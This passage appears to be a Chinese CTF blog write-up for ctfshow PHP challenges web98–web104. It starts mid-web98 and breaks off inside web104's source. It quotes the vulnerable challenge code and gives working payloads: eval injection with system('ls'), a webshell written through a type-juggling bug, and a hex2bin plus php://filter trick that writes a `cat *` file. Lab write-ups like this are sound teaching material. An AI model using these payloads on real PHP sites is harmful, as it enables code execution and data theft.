<p><a href="https://blog.csdn.net/bys617120/article/details/135314637">CTFSHOW web入门刷题 web98-112_ctfshow web98-CSDN博客</a></p>
<p>这道题用到了三元运算符</p>
<p>首先判断是否GET传入了数据，如果传入了则将POST的地址赋值给了GET</p>
<p>其实就是用POST替换GET</p>
<p>如果GET存在flag字段的值则会继续替换，最后替换成SERVER</p>
<p>这里我们只要GET随便传入一个数据让post替换get</p>
<p>然后post传入 HTTP_FLAG=flag</p>
<p>这样最后highlight_file就能去显示$flag</p></blockquote>
<p>这道题一开始没看懂代码，看了上面大佬的解释感觉其实也不难</p>
<p><img alt="image-20241201230323939" loading="lazy" src="assets/image-20241201230323939.png"></p>
<h4 id="web99">web99<a hidden class="anchor" aria-hidden="true" href="#web99">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 22:36:12
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$allow</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">36</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x36d</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$allow</span><span class="p">,</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nv">$i</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span> <span class="nv">$allow</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这道题首先是创建了一个数组，然后通过循环写入数字（范围0~0x36d）</p>
<p><img alt="image-20241202141710538" loading="lazy" src="assets/image-20241202141710538.png"></p>
<p>接着对传入的n进行判断，判断其是否在数组中，若存在则以n为名字创建一个文件并写入content的内容</p>
<p>我们需要知道的是：</p>
<blockquote>
<p>在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的</p></blockquote>
<p>所以我们通过传入content写马后，通过蚁剑连接或者直接命令执行即可得到flag</p>
<p><img alt="image-20241202141941439" loading="lazy" src="assets/image-20241202141941439.png"></p>
<h4 id="web100">web100<a hidden class="anchor" aria-hidden="true" href="#web100">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-21 22:10:28
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;ctfshow.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1">//flag in class ctfshow;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1"></span><span class="nv">$ctfshow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v1</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$v2</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$v3</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nv">$v0</span><span class="o">=</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;/&#34;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;/&#34;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">      <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$v2</span><span class="s2">(&#39;ctfshow&#39;)</span><span class="si">$v3</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl">
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题其实就是一道简单的拼接题</p>
<pre tabindex="0"><code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
</code></pre><p>这里看起来像是要求v1，v2，v3都为数字，实际上只需v1为数字则会将v1赋给v0，而不会再执行后面的语句</p>
<p>所以我们这里只需要使v1为数字即可</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=21&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;
</code></pre><p>或者用命令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cobol" data-lang="cobol"><span class="line"><span class="ln">1</span><span class="cl"><span class="c">?v1=1&amp;</span><span class="nv">v2</span><span class="o">=</span><span class="nv">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">/*</span><span class="p">&amp;</span><span class="nv">v3</span><span class="o">=*/</span><span class="p">;</span><span class="err">
</span></span></span></code></pre></div><p><img alt="image-20241202145637866" loading="lazy" src="assets/image-20241202145637866.png"></p>
<p>将0x2d更换成-得到flag</p>
<h4 id="web101">web101<a hidden class="anchor" aria-hidden="true" href="#web101">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-22 00:26:48
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;ctfshow.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1">//flag in class ctfshow;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1"></span><span class="nv">$ctfshow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v1</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$v2</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$v3</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nv">$v0</span><span class="o">=</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\?|[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$v2</span><span class="s2">(&#39;ctfshow&#39;)</span><span class="si">$v3</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>题目描述:修补100题非预期,替换0x2d</p>
<p>修补了上一题通过直接命令执行或者var_dump打印类的方法</p>
<p>我们可以尝试使用反射类的方法，利用题目给出的<code>('ctfshow')</code>来拼接打印类</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;
</code></pre><p><img alt="image-20241202152406295" loading="lazy" src="assets/image-20241202152406295.png"></p>
<p>这道题的flag少了一位，在得到的flag在替换掉0x2d后，再进行爆破即可得到flag</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="s2">&#34;fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42&#34;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0x2d&#34;</span><span class="p">,</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nb">hex</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="p">,</span><span class="s2">&#34;5&#34;</span><span class="p">,</span><span class="s2">&#34;6&#34;</span><span class="p">,</span><span class="s2">&#34;7&#34;</span><span class="p">,</span><span class="s2">&#34;8&#34;</span><span class="p">,</span><span class="s2">&#34;9&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">,</span><span class="s2">&#34;b&#34;</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">,</span><span class="s2">&#34;d&#34;</span><span class="p">,</span><span class="s2">&#34;e&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">hex</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ctfshow{&#34;</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="s2">&#34;}&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web102">web102<a hidden class="anchor" aria-hidden="true" href="#web102">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-23 20:59:43
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v4</span> <span class="o">=</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v4</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$v2</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$v3</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>分析一下这段代码</p>
<p>首先这段代码会接收三个参数v1,v2,v3</p>
<p>根据php的特性，当$v2为数字时$v4就会被赋值为1，而与$v3的值无关</p>
<p>所以想要进入判断，我们首先要使v2为数字</p>
<p>接着会通过substr对v2前两段进行截断并赋值给s</p>
<p>下一步就会将v1和s都传入call_user_func函数</p>
<p><strong>call_user_func函数有什么用呢?</strong></p>
<p><code>call_user_func</code> 是 PHP 中的一个内置函数，它的主要作用是调用回调函数。</p>
<pre tabindex="0"><code>function greet($name) {
    return &#34;Hello, $name!&#34;;
}

$message = call_user_func(&#39;greet&#39;, &#39;John&#39;);
echo $message; 
</code></pre><p>我们先不管他怎么利用，接着往下看</p>
<p>最后会调用file_put_contents函数，那思路就很明显了，我们通过写文件来拿到flag</p>
<p>但是我们要将v2这一串数字经过一系列转换后写入文件并执行要怎么做呢？</p>
<p>假如说我们可以将php代码转换成base64后再转换成hex，而得到的hex又刚好为数字，那我们就能实现我们的目标。</p>
<p><strong>那怎么进行格式转换呢?</strong></p>
<p>我们可以通过call_user_func函数调用php的内置类hex2bin，将我们传入的v2转换回base64编码，接着在写文件的时候，再通过php伪协议的方式将base64先转换为我们的代码再写入文件。</p>
<p>经过尝试我们可以得到符合条件的代码</p>
<pre tabindex="0"><code>&lt;?=`cat *`;
base64:PD89YGNhdCAqYDs= (转hex去掉=)
hex:5044383959474E6864434171594473
</code></pre><p>我们需要在hex前面随便加两位数字来绕过截断</p>
<p>payload:</p>
<pre tabindex="0"><code>v1=hex2bin
v2=665044383959474E6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php
</code></pre><h4 id="web103">web103<a hidden class="anchor" aria-hidden="true" href="#web103">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-23 21:03:24
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v4</span> <span class="o">=</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v4</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$v2</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/.*p.*h.*p.*/i&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$v3</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Sorry&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题相比上一题多了一个过滤</p>
<pre tabindex="0"><code>if(!preg_match(&#34;/.*p.*h.*p.*/i&#34;,$str)){
        file_put_contents($v3,$str);
    }
    else{
        die(&#39;Sorry&#39;);
    }
</code></pre><p>继续用上题的方法即可</p>
<p>payload:</p>
<pre tabindex="0"><code>v1=hex2bin
v2=665044383959474E6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php
</code></pre><h4 id="web104">web104<a hidden class="anchor" aria-hidden="true" href="#web104">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:27:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
